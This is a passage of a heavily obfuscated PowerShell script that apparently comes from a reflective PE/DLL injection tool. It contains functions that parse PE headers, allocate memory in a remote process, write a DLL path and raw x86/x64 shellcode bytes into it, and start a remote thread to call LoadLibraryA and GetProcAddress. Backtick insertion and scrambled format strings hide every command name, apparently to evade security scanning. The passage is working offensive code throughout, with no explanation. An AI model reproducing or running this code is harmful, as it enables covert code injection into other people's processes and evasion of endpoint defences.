		${nt`h`eA`dersiN`FO} = &("{2}{0}{3}{1}{4}" -f't-','mageNtH','Ge','I','eaders') -PEHandle ${U`N`MAN`AGe`DPebyt`Es} -Win32Types ${Wi`N`32tYP`ES}
		
		
		${Pei`NFO} | &("{2}{0}{1}"-f 'mb','er','Add-Me') -MemberType ("{1}{0}{3}{2}"-f 'tePr','No','y','opert') -Name ("{0}{1}" -f'PE64B','it') -Value (${n`ThEA`DeR`SiN`FO}."pE64b`It")
		${PeIN`Fo} | &("{0}{2}{1}"-f'Add-','mber','Me') -MemberType ("{2}{1}{0}" -f 'perty','Pro','Note') -Name ("{2}{1}{0}{3}" -f 'lImag','igina','Or','eBase') -Value (${NT`hEad`e`R`SINFO}."ima`ge_Nt_`HEa`DE`Rs"."oPT`IOnalHe`ADeR"."imAgeB`Ase")
		${P`eiN`FO} | &("{2}{1}{0}" -f 'ember','M','Add-') -MemberType ("{0}{1}{3}{2}" -f'Not','ePrope','y','rt') -Name ("{2}{0}{1}{3}"-f 'izeO','fImag','S','e') -Value (${Nthea`derSi`NfO}."I`magE_nT_h`eadeRS"."OptIOn`A`lHeAd`ER"."s`iZEo`FIMA`ge")
		${peI`Nfo} | &("{2}{0}{1}"-f '-Memb','er','Add') -MemberType ("{1}{0}{3}{2}"-f'eP','Not','operty','r') -Name ("{1}{0}{2}"-f 'e','SizeOfH','aders') -Value (${nth`E`A`DeRsIn`Fo}."ImA`gE`_nt`_He`AdeRS"."OpTIO`N`ALHEAdeR"."S`IzeoF`HeaDers")
		${p`EINfo} | &("{3}{0}{2}{1}" -f'Me','r','mbe','Add-') -MemberType ("{1}{2}{3}{0}"-f 'perty','Note','Pr','o') -Name ("{3}{1}{0}{2}{4}"-f'Cha','ll','rac','D','teristics') -Value (${NthE`ADe`Rs`i`Nfo}."iMAGE_n`T_hEaDE`RS"."oPtIOnAL`He`A`der"."dLlc`H`Ar`ACTE`RiStIcS")
		
		
		  $15Y4hs::("{2}{0}{1}{3}" -f'reeHGl','o','F','bal').Invoke(${UNmAn`Aged`Pe`B`YtES})
		
		return ${P`EinfO}
	}


	
	
	Function G`et`-PE`dETaiL`E`DinFO
	{
		Param(
		[Parameter( pOSitiOn = 0, ManDaTOrY = ${T`RuE})]
		[IntPtr]
		${PE`HandLe},
		
		[Parameter(positIoN = 1, mANDatORy = ${tR`UE})]
		[System.Object]
		${w`IN32`TyP`es},
		
		[Parameter(pOSITION = 2, mANdaTorY = ${T`Rue})]
		[System.Object]
		${w`I`N32CO`NsTAnts}
		)
		
		if (${pe`hA`NdLE} -eq ${Nu`ll} -or ${pehAN`d`Le} -eq   (  &("{0}{1}"-f 'GC','i') ('vARia'+'Bl'+'E'+':'+'1I2l') )."Va`Lue"::"Z`ERo")
		{
			throw ("{5}{2}{4}{0}{3}{1}" -f'tr.','ro','EHandle is','Ze',' null or IntP','P')
		}
		
		${PEiN`FO} = &("{2}{3}{0}{1}"-f'Ob','ject','Ne','w-') ("{1}{3}{0}{2}" -f 'tem.Ob','S','ject','ys')
		
		
		${NTHe`ADer`s`InFo} = &("{3}{2}{0}{1}"-f'H','eaders','t-ImageNt','Ge') -PEHandle ${Pe`H`ANdlE} -Win32Types ${WIN32t`Y`PES}
		
		
		${PE`I`NfO} | &("{0}{1}{2}"-f 'A','dd-Memb','er') -MemberType ("{1}{2}{0}"-f 'y','N','otePropert') -Name ("{1}{2}{0}"-f 'andle','P','EH') -Value ${peh`A`ND`LE}
		${PeIN`FO} | &("{0}{2}{1}"-f 'Add-','ember','M') -MemberType ("{3}{2}{1}{0}" -f'y','opert','ePr','Not') -Name ("{2}{3}{1}{0}" -f'NT_HEADERS','_','IMA','GE') -Value (${n`THe`Ad`ErS`InFO}."iMAge_N`T_HEA`D`e`Rs")
		${pein`FO} | &("{0}{1}{2}"-f'A','dd','-Member') -MemberType ("{0}{1}{2}{3}" -f 'N','o','te','Property') -Name ("{3}{2}{1}{0}" -f 'rsPtr','e','ad','NtHe') -Value (${Nth`EAd`e`RS`INFo}."nt`HeaD`Er`SPTR")
		${pEIN`Fo} | &("{2}{1}{0}" -f'r','Membe','Add-') -MemberType ("{2}{0}{1}"-f'otePropert','y','N') -Name ("{1}{2}{0}"-f '4Bit','PE','6') -Value (${NtH`EAd`E`Rs`iNfO}."P`E64BIt")
		${P`E`iNfo} | &("{2}{3}{1}{0}"-f'ber','Mem','Add','-') -MemberType ("{2}{1}{0}"-f 'eProperty','ot','N') -Name ("{2}{0}{1}"-f 'ag','e','SizeOfIm') -Value (${NTHe`A`derSi`NfO}."IMage`_`NT_`head`E`RS"."O`pTiOn`Al`h`EAdEr"."SI`ZEOfImA`Ge")
		
		if (${p`eI`NFo}."p`e6`4biT" -eq ${Tr`UE})
		{
			[IntPtr]${seCTiO`NhE`ADE`RPTr} = [IntPtr](&("{1}{3}{4}{5}{2}{0}"-f'gned','Ad','i','d-S','ignedIntAsU','ns') ([Int64]${p`EIN`Fo}."Nt`H`Eade`RSPTr") ( ( &("{3}{2}{0}{1}" -f'aRiabL','e','-v','GeT')  ('1'+'5Y4H'+'s') )."VA`LUe"::"S`iZeOf"([Type]${wIn32t`YP`Es}."IMA`GE_N`T_hEadE`R`S`64")))
			${PeiN`Fo} | &("{1}{2}{0}" -f 'mber','Add-','Me') -MemberType ("{2}{1}{0}{3}" -f'er','op','NotePr','ty') -Name ("{1}{2}{0}"-f 'tr','Sectio','nHeaderP') -Value ${SE`CTiON`heaDe`RPtR}
		}
		else
		{
			[IntPtr]${SeCTI`O`NHeaDER`PTr} = [IntPtr](&("{3}{0}{5}{1}{2}{6}{4}"-f 'd-','ign','edInt','Ad','gned','S','AsUnsi') ([Int64]${peI`NFO}."nTHeAD`eR`spTr") (  (&("{1}{2}{0}" -f'M','ChILdi','TE')  ("V"+"ariAb"+"lE:15y"+"4HS")  )."vaL`Ue"::"SizE`of"([Type]${w`In32Typ`ES}."IMAGE`_Nt_Hea`ders`32")))
			${P`E`inFo} | &("{2}{3}{1}{0}" -f 'mber','Me','Add','-') -MemberType ("{2}{1}{0}"-f 'erty','eProp','Not') -Name ("{3}{2}{4}{1}{0}"-f'tr','erP','onH','Secti','ead') -Value ${seCtI`on`HeaDE`RPTR}
		}
		
		if ((${N`Th`e`ADER`sInFo}."i`ma`g`E_n`T_h`EADers"."fileHEA`D`Er"."CH`AraCt`eR`ist`iCS" -band ${Win32CoNs`TA`N`TS}."i`MAGE`_`F`ILE_DlL") -eq ${w`I`N3`2consTaN`Ts}."i`MagE_Fil`e`_dLl")
		{
			${P`EiN`FO} | &("{0}{1}{2}"-f 'A','dd','-Member') -MemberType ("{2}{0}{1}" -f 'o','perty','NotePr') -Name ("{1}{2}{0}"-f 'pe','F','ileTy') -Value 'DLL'
		}
		elseif ((${Nthe`AD`eRs`i`NFo}."iM`AGE`_nT_HEA`dErS"."FILe`he`A`Der"."ChARaC`TERISt`i`cS" -band ${wiN32`cOn`sTA`NTs}."i`M`AGe_`FiL`E_ExEC`U`TABle_i`MaGe") -eq ${w`in3`2con`sT`ANTs}."IMAgE_FIL`E_E`XE`c`UTab`Le_imaGe")
		{
			${P`eINFO} | &("{2}{0}{1}"-f'dd-Me','mber','A') -MemberType ("{1}{2}{0}{3}"-f'tePropert','N','o','y') -Name ("{2}{1}{0}"-f 'Type','ile','F') -Value 'EXE'
		}
		else
		{
			Throw ("{3}{0}{1}{7}{2}{5}{6}{4}"-f ' ','is','n','PE file',' an EXE or DLL','o','t',' ')
		}
		
		return ${p`eiN`FO}
	}
	
	
	Function I`mPOrt-Dll`iN`Re`MOt`epr`OCESS
	{
		Param(
		[Parameter(poSiTioN=0, mAnDATory=${T`RuE})]
		[IntPtr]
		${rEm`oTeP`ROC`Hand`lE},
		
		[Parameter(pOSitIon=1, MAnDAtOrY=${tR`Ue})]
		[IntPtr]
		${iMp`o`RtDLl`pa`THp`Tr}
		)
		
		${pTRS`i`zE} =  (&("{1}{0}{2}" -f 'aBl','varI','e')  15Y4HS )."vAl`UE"::"SI`Z`eof"([Type][IntPtr])
		
		${I`MP`ORtDl`Lpa`Th} =  ( &("{1}{2}{0}"-f'Le','vaRIa','b') ("15"+"Y4H"+"s") )."v`AluE"::("{3}{4}{2}{1}{0}" -f'nsi','ingA','r','Ptr','ToSt').Invoke(${im`PO`RTdllp`ATHpTR})
		${dLL`Pa`ThS`ize} = [UIntPtr][UInt64]([UInt64]${I`m`p`ORTDLlp`Ath}."LEn`gth" + 1)
		${RiM`porTd`L`lpa`THPTR} = ${w`IN32`Fu`NctIoNs}."v`irTuaLaLL`O`cEX"."INV`Oke"(${Re`moTepROChA`N`dLE},   $1I2l::"Z`erO", ${dl`lPATh`s`IzE}, ${wIN3`2`CONsTA`N`Ts}."ME`m_CO`mmit" -bor ${W`In`3`2coNstaNTS}."m`Em_`RE`SERVE", ${WIn3`2COnS`T`A`NtS}."pAg`E`_`READWRite")
		if (${ri`m`POrTDlL`P`AThp`TR} -eq   $1i2l::"Z`ERo")
		{
			Throw ("{5}{8}{0}{9}{11}{1}{7}{2}{6}{4}{10}{3}" -f 'a','to allo','emory in','s','e r','U',' th','cate m','n','b','emote proces','le ')
		}

		[UIntPtr]${nuM`By`TesWriT`Ten} =   ( &('GI') VARIAbLe:pImbt  )."val`Ue"::"zE`Ro"
		${suC`C`ESs} = ${WiN3`2FUN`cTionS}."WRIte`pr`OCes`s`m`emorY"."in`V`OKE"(${r`EmO`Te`P`RoChaNd`Le}, ${RImpoR`T`dlLpa`ThPTr}, ${I`M`PO`RTDlLpAT`H`PTR}, ${Dl`L`pAThSi`ze}, [Ref]${NUmByTe`S`WR`iT`T`EN})
		
		if (${sUCCE`ss} -eq ${Fa`lSE})
		{
			Throw ("{0}{4}{3}{2}{5}{8}{6}{1}{7}{9}"-f'Unabl','m','DLL',' write ','e to',' path to remote p','ss ','e','roce','mory')
		}
		if (${D`L`lpaT`HsizE} -ne ${n`U`M`BY`TEswrItteN})
		{
			Throw ((("{8}{10}{12}{17}{15}{21}{26}{14}{27}{22}{1}{24}{16}{6}{20}{2}{3}{19}{4}{25}{23}{18}{5}{11}{0}{13}{9}{7}" -f'p','y','a DLL pat','h to lo','d t','rem','t','s','D','s','idn','ote ','0Iqt w','roce','cted ',' the e','i','rite',' ','a','ing ','xp','unt of b','the','tes when wr','o ','e','amo'))-replacE'0Iq',[chAr]39)
		}
		
		${K`e`RN`El32`HANdlE} = ${wIN32FUn`Ct`I`oNs}."GE`TM`oDUL`ehandLe"."in`Vo`ke"(("{3}{2}{1}{0}" -f'l','dl','.','kernel32'))
		${LOAdLI`Bra`RyA`AddR} = ${wiN32Fu`N`ctiO`Ns}."GET`p`R`oC`ADDREss"."in`VoKE"(${KE`RNEl32`HaNdLE}, ("{2}{3}{1}{0}" -f 'ryA','a','LoadL','ibr')) 
		
		[IntPtr]${dlLADd`RE`Ss} =  (&("{2}{1}{0}{3}" -f 'b','VAria','geT-','lE')  ("1i2"+"l") -vaL )::"Z`ERO"
		
		
		if (${peI`N`Fo}."p`E6`4biT" -eq ${TR`Ue})
		{
			
			${L`o`A`dLiB`RaR`YareTMEm} = ${W`iN`32fUNCt`IoNs}."Virtu`ALA`LloCeX"."iN`Vo`KE"(${ReM`O`TePr`ochandLE},  ( &("{1}{3}{0}{2}"-f'ARIA','g','BLe','et-V')  1I2l -Va )::"zE`Ro", ${DLl`PAt`h`sIZe}, ${win`3`2CoNS`T`ANtS}."mE`M_Co`mMit" -bor ${wi`N32`co`NstAnTS}."MEM_r`e`S`ERvE", ${w`iN`3`2COn`StAnTS}."Pa`gE`_`ReADW`RITE")
			if (${L`OA`dlI`BRA`RYA`RETm`em} -eq   (  &("{1}{2}{0}{3}"-f 'v','G','eT-','aRIAble') 1i2l  -vAluEoN)::"z`eRO")
			{
				Throw ("{3}{6}{2}{4}{7}{9}{13}{1}{11}{8}{12}{10}{5}{0}" -f 'raryA','e',' alloc','Un','ate m','f LoadLib','able to','emory i','process','n ','he return value o','mote ',' for t','the r')
			}
			
			
			
			${LOA`D`LIbrArysc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${L`OA`dl`Ib`RARysC2} = @(0x48, 0xba)
			${lOA`Dl`IBraR`Y`sC3} = @(0xff, 0xd2, 0x48, 0xba)
			${l`oADLIbr`Ar`yS`C4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			${sC`Le`NgTh} = ${Lo`AD`lIBr`ARys`C1}."l`eNgTh" + ${l`oa`d`lIbRa`RYsC2}."lE`N`Gth" + ${L`o`ADlIBrAR`y`sC3}."l`EnGtH" + ${l`OadLIb`R`ARYSC4}."LenG`Th" + (${p`T`RSizE} * 3)
			${scP`SM`EM} =   ( &("{2}{0}{1}" -f 'riAB','lE','va')  ('15y'+'4H'+'s')  )."v`Alue"::("{1}{0}{2}"-f'cHGlob','Allo','al').Invoke(${sc`Le`Ng`TH})
			${scp`smE`M`OR`igInaL} = ${sc`p`smem}
			
			&("{4}{2}{3}{1}{0}" -f'mory','sToMe','-Byt','e','Write') -Bytes ${lOaDLIb`R`ARy`sc1} -MemoryAddress ${S`cps`mEm}
			${sCp`SmEm} = &("{2}{1}{5}{3}{4}{0}" -f'ed','-S','Add','edIntAsUnsig','n','ign') ${S`cPS`MEm} (${l`oaDl`ib`RAR`Ysc1}."l`E`NgtH")
			 ( &("{0}{1}" -f 'g','Ci')  VarIable:15Y4hS )."va`LUe"::("{1}{0}{3}{2}"-f 'ucture','Str','Ptr','To').Invoke(${r`IMPORTDl`LpA`T`HPtr}, ${Scp`smEm}, ${fAL`SE})
			${S`C`PsMEm} = &("{5}{0}{3}{6}{2}{4}{1}"-f 'dd-Signe','ed','Unsi','dIntA','gn','A','s') ${SCp`s`mEM} (${pTr`si`ze})
			&("{2}{0}{3}{1}"-f'Bytes','y','Write-','ToMemor') -Bytes ${LOadl`ibr`ARYSC2} -MemoryAddress ${s`cPS`MeM}
			${s`CpSM`em} = &("{1}{3}{2}{4}{0}"-f 'ned','Add-Sig','d','ne','IntAsUnsig') ${SCpSM`Em} (${l`o`AD`LiBRARYsC2}."lE`NGTH")
			 (  &("{2}{0}{1}" -f 'BL','E','variA')  15y4Hs -VALueOn )::("{0}{2}{4}{1}{3}" -f 'S','t','tru','ureToPtr','c').Invoke(${l`OaDlIb`RArya`ADDR}, ${scpS`MEM}, ${Fa`Lse})
			${Sc`pSM`EM} = &("{1}{3}{2}{0}{4}{5}" -f 'S','A','-','dd','ignedIn','tAsUnsigned') ${SC`PSM`eM} (${pTR`Si`zE})
			&("{4}{1}{0}{5}{3}{2}"-f 'oM','esT','ory','m','Write-Byt','e') -Bytes ${lOad`liB`R`ArYSC3} -MemoryAddress ${S`cp`sMEm}
			${SCps`mEm} = &("{0}{4}{2}{1}{3}" -f 'Add-Sign','g','nsi','ned','edIntAsU') ${Sc`pSmem} (${LOAdL`IbraR`Y`S`C3}."LENg`TH")
			  ( &("{2}{0}{1}"-f'riAbl','E','VA') ('15y'+'4hs')  -ValueONlY  )::("{0}{1}{2}"-f'S','tructur','eToPtr').Invoke(${l`OadLIBRaR`YaRe`TmEM}, ${s`Cpsmem}, ${fA`L`SE})
			${ScP`sMEM} = &("{1}{0}{4}{5}{3}{2}{6}" -f 'dd-S','A','i','ns','ignedIntAs','U','gned') ${Sc`p`smeM} (${Pt`RS`izE})
			&("{5}{3}{1}{0}{4}{2}"-f 'ToM','tes','mory','By','e','Write-') -Bytes ${Lo`A`Dli`BraR`YSc4} -MemoryAddress ${sc`pSmEm}
			${scPS`M`Em} = &("{1}{0}{4}{3}{5}{2}"-f'dd-','A','igned','sU','SignedIntA','ns') ${scpSm`EM} (${lo`AdL`I`BraRysc4}."LeNg`Th")

			
			${rs`cad`dr} = ${win3`2`Fu`NcTIONs}."v`IrtUAlalL`ocEX"."in`VOke"(${R`e`mOTeProcHaNd`LE},  $1I2l::"ze`RO", [UIntPtr][UInt64]${S`cLeNgTh}, ${wi`N3`2C`o`NstAntS}."MEm`_coM`miT" -bor ${w`iN`32`cON`sTANTs}."MEm_`RE`serve", ${WiN`32`cO`N`stAnts}."PaG`e_e`xEcut`e`_r`Eadw`RITe")
			if (${rScAd`dr} -eq   $1i2L::"ze`RO")
			{
				Throw ("{1}{3}{9}{7}{4}{8}{0}{11}{13}{5}{2}{12}{6}{10}" -f 'pr','U','shel','nable','ry i',' for ','c','locate memo','n the remote ',' to al','ode','oc','l','ess')
			}
			
			${sU`C`ceSS} = ${W`iN32f`Un`c`TIONS}."Wri`TEPR`OCESSm`Em`ORy"."i`NvOKE"(${rE`MOt`Ep`RoChaNd`le}, ${rsCA`d`DR}, ${sCpsM`EMOR`iGi`NAL}, [UIntPtr][UInt64]${sCleng`TH}, [Ref]${n`U`mb`YteSWR`ITTen})
			if ((${sU`cC`eSS} -eq ${FAl`Se}) -or ([UInt64]${N`UMbY`TEswRI`Tt`eN} -ne [UInt64]${sc`Le`NGtH}))
			{
				Throw ("{8}{1}{0}{7}{5}{6}{3}{4}{2}" -f 't','able ','s memory.','e pro','ces',' write shellco','de to remot','o','Un')
			}
			
			${rT`hR`eADh`Andle} = &("{6}{2}{1}{3}{4}{5}{0}"-f 'd','o','eRem','teT','hr','ea','Invoke-Creat') -ProcessHandle ${R`E`Mot`EPro`CH`Andle} -StartAddress ${r`sca`ddR} -Win32Functions ${wI`N32FUn`C`T`IONs}
			${rES`ULt} = ${w`IN32`FuN`CTi`oNs}."WaIt`ForSIn`g`LEO`Bj`eCt"."iN`VoKE"(${r`THReAdh`AnDLE}, 20000)
			if (${r`eSu`Lt} -ne 0)
			{
				Throw ("{11}{13}{10}{9}{14}{12}{8}{4}{6}{0}{2}{1}{5}{3}{7}" -f 'o','Addres','c','faile','o ca','s ','ll GetPr','d.','eThread t','e',' Creat','Call ','emot','to','R')
			}
			
			
			[IntPtr]${r`etURnVAl`meM} =  ( &("{0}{2}{3}{1}"-f'gE','aBlE','T-VaR','I')  ('1'+'5Y4hs')  -vaLueON  )::("{3}{2}{1}{0}" -f 'al','ocHGlob','ll','A').Invoke(${Ptr`S`Ize})
			${Res`U`LT} = ${WI`N3`2fuNCTI`ONs}."Rea`dPR`OceSs`meM`ORy"."In`VoKE"(${REM`oTePrOc`HA`N`DLe}, ${L`o`AdlibRaRYareTM`eM}, ${REt`URN`V`ALmEM}, [UIntPtr][UInt64]${PTrs`ize}, [Ref]${N`UmBYteSw`R`I`TTen})
			if (${RESU`lt} -eq ${F`A`lse})
			{
				Throw ("{2}{1}{6}{0}{3}{4}{5}"-f 'P','o Re','Call t','rocessMemory f','ai','led','ad')
			}
			[IntPtr]${Dl`La`D`drESS} =   ( &("{1}{0}"-f'abLE','VARI') ('1'+'5y'+'4hs')  )."VAL`UE"::"PTRtOSt`R`UC`TuRE"(${R`et`UrnVALMeM}, [Type][IntPtr])

			${w`In3`2FU`NC`TIONS}."v`iRt`U`ALFrEEEX"."i`NvO`ke"(${r`EMot`E`proCHAND`Le}, ${load`l`IBrA`RyaRETMEM}, [UIntPtr][UInt64]0, ${WIN32`CO`N`STa`NTs}."meM_`R`E`lEAsE") | &("{1}{0}" -f't-Null','Ou')
			${w`I`N32fuNCT`ioNs}."viR`T`UAlFR`EEEx"."INVO`kE"(${Rem`OT`Ep`RO`CHAn`dlE}, ${rSCa`D`DR}, [UIntPtr][UInt64]0, ${WIn3`2cONSTA`NtS}."mEm_`RElE`AsE") | &("{1}{2}{0}"-f'l','Out-N','ul')
		}
		else
		{
			[IntPtr]${rt`HREADHa`N`dLe} = &("{3}{5}{1}{7}{4}{2}{6}{0}" -f'ad','eateR','eTh','I','mot','nvoke-Cr','re','e') -ProcessHandle ${rEM`otep`ROc`H`ANDLE} -StartAddress ${L`O`ADLIBRAryaAD`Dr} -ArgumentPtr ${rImp`o`RtdL`Lp`AtHpTR} -Win32Functions ${w`I`N32`Fun`ctIOnS}
			${R`e`sULt} = ${wIN`3`2fuNC`TIoNs}."wAitFORsiNgleo`B`j`ECT"."inVo`Ke"(${r`ThREaDHA`NDlE}, 20000)
			if (${re`S`ULT} -ne 0)
			{
				Throw ("{6}{2}{9}{5}{7}{4}{11}{0}{10}{3}{8}{1}" -f' call Get','ailed.','Creat','oc','oteTh','R','Call to ','em','Address f','e','Pr','read to')
			}
			
			[Int32]${EXITc`o`De} = 0
			${R`Esult} = ${WI`N3`2fUnc`Tio`Ns}."geTEXitCod`etH`RE`Ad"."InV`OKE"(${Rt`Hr`EAd`Ha`Ndle}, [Ref]${E`X`ITcOde})
			if ((${r`E`sULT} -eq 0) -or (${eXiT`C`OdE} -eq 0))
			{
				Throw ("{1}{4}{0}{3}{5}{2}"-f'tExitCo','Call to G','ailed','deThrea','e','d f')
			}
			
			[IntPtr]${Dl`L`Addre`sS} = [IntPtr]${ExIt`C`ode}
		}
		
		${WI`N32`Fu`NcTio`Ns}."virt`UALFReE`Ex"."iN`Voke"(${r`emOtEp`R`OcHANdlE}, ${RI`MPO`RtDLLpa`Thptr}, [UIntPtr][UInt64]0, ${wI`N32conStan`Ts}."MeM_R`Ele`A`SE") | &("{1}{0}"-f'ull','Out-N')
		
		return ${dLladd`R`E`ss}
	}
	
	
	Function gET-RemO`TE`P`R`OCa`dDreSs
	{
		Param(
		[Parameter(pOSItIoN=0, ManDATORY=${TR`UE})]
		[IntPtr]
		${rE`moT`epR`oCh`And`le},
		
		[Parameter(PoSitION=1, mAnDatOrY=${tr`UE})]
		[IntPtr]
		${Re`MoTed`lLH`AnDLe},
		
		[Parameter(POsition=2, MANDatoRy=${Tr`UE})]
		[String]
		${fU`Ncti`ON`NAme}
		)

		${PT`RsI`zE} =  ( &("{1}{0}"-f 'e','VARIaBL') ("15Y"+"4hs") -vAlUeonl)::"sI`ZeOF"([Type][IntPtr])
		${f`UnCTi`OnN`AmE`pTR} =  ( &("{0}{1}{2}"-f 'VA','r','iaBle') ('15y4h'+'s')  -vaL  )::("{0}{3}{1}{2}" -f'StringToHGl','balAns','i','o').Invoke(${fU`Nc`TION`NamE})
		
		
		${FuNCtI`ON`NAmEsI`ZE} = [UIntPtr][UInt64]([UInt64]${FuncT`IO`NNaMe}."lE`NGth" + 1)
		${RFUN`c`NAMePTR} = ${WiN3`2fUn`C`TIoNs}."V`I`RTUalAL`LoCEx"."In`VoKE"(${REmOtepR`O`C`Ha`NdlE},   ( &("{2}{1}{3}{0}" -f 'blE','-VaR','Get','Ia') 1I2L  -VAl)::"z`ERO", ${FunC`TIon`NA`m`ESize}, ${WIN`32conSta`NtS}."MEM`_Com`mIt" -bor ${win32`c`onSt`Ants}."mEM_r`e`seR`VE", ${wIn32COnS`T`A`N`TS}."pA`Ge_re`A`dwRITE")
		if (${rFuNCN`AM`EPtR} -eq  ( &("{1}{0}{2}" -f'ariabL','v','e')  1I2L -vaLUEOnL )::"Ze`Ro")
		{
			Throw ("{5}{3}{1}{2}{4}{9}{8}{7}{6}{0}"-f 'e process','able',' ','n','to allo','U','the remot',' ','memory in','cate ')
		}

		[UIntPtr]${Nu`m`ByTes`wriTT`en} =  $pImbT::"ze`Ro"
		${SuC`ce`Ss} = ${w`in`32FU`NCT`ioNs}."write`Proc`esS`Me`MORy"."iNVO`kE"(${REmo`TepROCHa`N`Dle}, ${r`FuN`CNAme`Ptr}, ${fUN`cTioN`NaMEPtR}, ${fU`NCtI`OnNA`meS`ize}, [Ref]${nU`mbYT`Esw`R`It`TEn})
		 $15Y4hS::("{1}{0}{2}"-f 'reeHGloba','F','l').Invoke(${f`U`N`ctIo`NNamE`PtR})
		if (${sUc`CE`SS} -eq ${Fa`l`Se})
		{
			Throw ("{1}{8}{0}{3}{7}{5}{2}{4}{6}" -f'o write','Una','o',' DLL path to','t','rem','e process memory',' ','ble t')
		}
		if (${F`UNc`TIONn`AmeS`iZe} -ne ${n`UMbYTe`S`WRiTt`En})
		{
			Throw ((("{17}{23}{22}{1}{6}{12}{16}{8}{24}{21}{5}{14}{13}{9}{4}{2}{25}{15}{0}{11}{10}{27}{20}{19}{26}{3}{18}{7}"-f' ','mF','hen wr','emote','s w','un','t w','s','he exp','of byte',' load to','path to','rite ',' ','t','ing a DLL','t','Di',' proces','h','t','ed amo','nB','d','ect','it','e r',' '))."rEp`lA`Ce"('BmF',[strING][cHAR]39))
		}
		
		
		${K`ErNE`l`32Han`dLe} = ${WI`N32F`U`NcT`IonS}."GETMOdul`eh`A`NDlE"."In`VokE"(("{2}{1}{0}" -f '32.dll','nel','ker'))
		${getp`Ro`c`AdD`RESSaDdr} = ${w`In32`FUnC`TiO`NS}."G`E`TpR`OcADDreSs"."INVO`kE"(${KErNE`l3`2hA`NDlE}, ("{2}{3}{1}{0}" -f 'ss','cAddre','GetPr','o')) 

		
		
		${gE`TP`ROCAd`DRES`sR`e`TmEM} = ${wiN`32FU`NC`TIoNs}."V`ir`TualALl`o`CEX"."in`VokE"(${RE`m`oTe`prOCh`ANdLe},   $1i2l::"ze`RO", [UInt64][UInt64]${PTrS`I`ZE}, ${Win3`2cO`NSTAntS}."me`M_c`OmMIT" -bor ${WiN3`2`coNSt`A`NTS}."MEm_rE`S`ervE", ${W`In32Co`NstAn`TS}."PAG`e_rEaDw`R`Ite")
		if (${ge`TProc`ADD`ReSs`ReT`MEm} -eq  (&("{3}{2}{1}{0}"-f'LE','AB','ET-Vari','g') 1i2l -vaLu)::"z`ERO")
		{
			Throw ("{11}{19}{16}{20}{5}{15}{14}{7}{12}{25}{2}{22}{23}{13}{9}{6}{21}{1}{18}{24}{0}{8}{10}{3}{17}{4}" -f ' Ge',' ',' fo','Ad','s','oca','u','he re','tPr','rn val','oc','Un','mote pro','tu','emory in t','te m','to ','dres','o','able ','all','e','r th','e re','f','cess')
		}
		
		
		
		
		
		[Byte[]]${GetproCAdDr`e`s`ssC} = @()
		if (${P`eINFO}."pE64`BIT" -eq ${t`RuE})
		{
			${g`ETpROcaDD`R`EsSSC1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${ge`TPrO`Caddr`es`SS`C2} = @(0x48, 0xba)
			${gEt`ProcAdD`RES`S`sC3} = @(0x48, 0xb8)
			${Ge`T`Proc`A`DdRess`Sc4} = @(0xff, 0xd0, 0x48, 0xb9)
			${gEtPro`CAD`d`R`e`SSSc5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${gEtPr`Ocad`DrES`ssC1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${GeTPROCAD`DrE`S`ss`c2} = @(0xb9)
			${Ge`T`p`ROcAddREsSsc3} = @(0x51, 0x50, 0xb8)
			${GETpR`O`cAddR`esssc4} = @(0xff, 0xd0, 0xb9)
			${GEtP`RocaDD`R`EssS`c5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${s`clENGth} = ${GET`prO`C`A`DdrEsS`Sc1}."LEn`gth" + ${GetpROCAdd`R`esSS`C2}."len`GTh" + ${g`e`TproC`Ad`dREssSC3}."lEn`gTh" + ${GE`Tp`R`oC`AddRE`SsSc4}."l`e`NGtH" + ${gE`T`PRo`caddresss`c5}."leN`GtH" + (${PTr`S`ize} * 4)
		${S`CPsMeM} =  $15y4hS::("{0}{1}{2}" -f'A','lloc','HGlobal').Invoke(${SCL`enG`TH})
		${SC`PSM`EMO`RIginal} = ${S`CPs`mEm}
		
		&("{6}{1}{2}{3}{0}{5}{4}" -f'ytes','t','e-','B','oMemory','T','Wri') -Bytes ${gEtPR`oca`D`dressSC1} -MemoryAddress ${ScP`SmeM}
		${sC`psM`Em} = &("{5}{2}{3}{0}{4}{1}" -f'tAsU','ned','-','SignedIn','nsig','Add') ${Sc`P`SMem} (${GetpRoca`dd`ReS`sSc1}."le`N`GTh")
		 $15y4hS::("{1}{0}{3}{2}"-f'uctur','Str','tr','eToP').Invoke(${REmo`Te`d`llhaNdlE}, ${sc`p`Smem}, ${Fal`SE})
		${S`Cps`mem} = &("{1}{0}{5}{4}{3}{6}{2}"-f'd-Si','Ad','signed','I','ed','gn','ntAsUn') ${sCp`SM`EM} (${ptr`si`ze})
		&("{3}{1}{0}{4}{2}" -f'esToMemo','ite-Byt','y','Wr','r') -Bytes ${GeTpR`ocaD`D`Ress`Sc2} -MemoryAddress ${sC`PsM`em}
		${S`CPSM`Em} = &("{1}{2}{0}{3}"-f'edIntAsUnsigne','Add-Sig','n','d') ${ScpSm`eM} (${GeT`prOc`AdDr`eSs`SC2}."L`ENgTH")
		  $15Y4HS::("{0}{3}{2}{1}" -f 'S','reToPtr','u','truct').Invoke(${rf`Un`Cn`Am`EPtR}, ${s`CPs`mem}, ${fAL`se})
		${s`cP`SMeM} = &("{3}{0}{4}{1}{2}{5}"-f 'nt','s','Uns','Add-SignedI','A','igned') ${Scpsm`eM} (${pTRS`i`Ze})
		&("{2}{3}{0}{1}{4}" -f 'sToM','e','Writ','e-Byte','mory') -Bytes ${GEtPR`ocADd`ReS`s`sC3} -MemoryAddress ${S`c`pSMEM}
		${S`C`psMeM} = &("{2}{4}{5}{6}{3}{1}{0}"-f 'ned','ig','Add-Sig','s','ned','Int','AsUn') ${s`cPs`Mem} (${getpRO`CAddR`e`SsSc3}."leN`GTh")
		 (&("{2}{0}{1}" -f'ar','iAbLe','v') 15Y4hs -vAl )::("{2}{1}{0}{3}" -f'reT','tructu','S','oPtr').Invoke(${gE`TpROCAD`dRE`ss`Ad`dr}, ${scP`sMem}, ${F`AlsE})
